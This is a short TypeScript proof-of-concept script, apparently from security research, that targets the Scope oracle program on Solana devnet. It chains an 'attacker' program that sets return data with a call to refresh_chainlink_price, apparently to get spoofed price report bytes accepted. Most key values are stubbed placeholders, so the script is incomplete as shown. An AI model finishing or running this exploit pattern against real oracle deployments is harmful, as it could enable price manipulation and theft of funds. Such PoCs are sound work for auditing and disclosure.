import { Keypair, Connection, clusterApiUrl, Transaction, SystemProgram, TransactionInstruction, PublicKey } from '@solana/web3.js';

// Attacker program id placeholder (will be replaced after deploy)
const ATTACKER_PROGRAM_ID = new PublicKey('AttaCk3rRetuRnData11111111111111111111111111');

// Scope program id on devnet (from repo features)
const SCOPE_PROGRAM_ID = new PublicKey('3Vw8Ngkh1MVJTPHthmUbmU2XKtFEkjYvJzMqrv2rh9yX');

async function main() {
  const url = process.env.RPC_URL || clusterApiUrl('devnet');
  const conn = new Connection(url, 'confirmed');
  const payer = Keypair.generate();
  await conn.requestAirdrop(payer.publicKey, 2n * 1_000_000_000n as unknown as number);

  // Placeholder malicious bytes; must be replaced with bytes that decode to a valid Chainlink ReportDataV3/7/8/9/10 for your mapping
  const malicious = Buffer.from([1,2,3,4]);

  // Ix0: attacker sets return data
  const attackerIx = new TransactionInstruction({
    programId: ATTACKER_PROGRAM_ID,
    keys: [],
    data: encodeAttackerSetBytes(malicious),
  });

  // Ix1: call Scope.refresh_chainlink_price with a real signed report (placeholder)
  const tokenIndex = 0; // set appropriately
  const signedReport = Buffer.alloc(0); // supply real serialized report bytes
  const scopeIx = buildScopeRefreshChainlinkPriceIx(tokenIndex, signedReport);

  const tx = new Transaction().add(attackerIx, scopeIx);
  const sig = await conn.sendTransaction(tx, [payer], { skipPreflight: true });
  console.log('Sent tx', sig);
}

function encodeAttackerSetBytes(data: Buffer): Buffer {
  // Anchor layout: discriminator (first 8 bytes) + borsh Vec<u8>
  const discr = attackerSetBytesDiscriminator();
  const len = Buffer.alloc(4);
  len.writeUInt32LE(data.length, 0);
  return Buffer.concat([discr, len, data]);
}

function attackerSetBytesDiscriminator(): Buffer {
  // Precomputed anchor discriminator for method name "global::set_bytes"
  // Replace with correct value if program id or crate changes; you can compute via Anchor or copy from logs
  return Buffer.from([0,0,0,0,0,0,0,0]);
}

function buildScopeRefreshChainlinkPriceIx(token: number, serializedReport: Buffer): TransactionInstruction {
  // Placeholder: user must construct proper accounts and instruction data per IDL.
  // Intentionally minimal here; you will fill accounts after creating a test feed via initialize + update_mapping.
  return new TransactionInstruction({ programId: SCOPE_PROGRAM_ID, keys: [], data: Buffer.alloc(0) });
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});

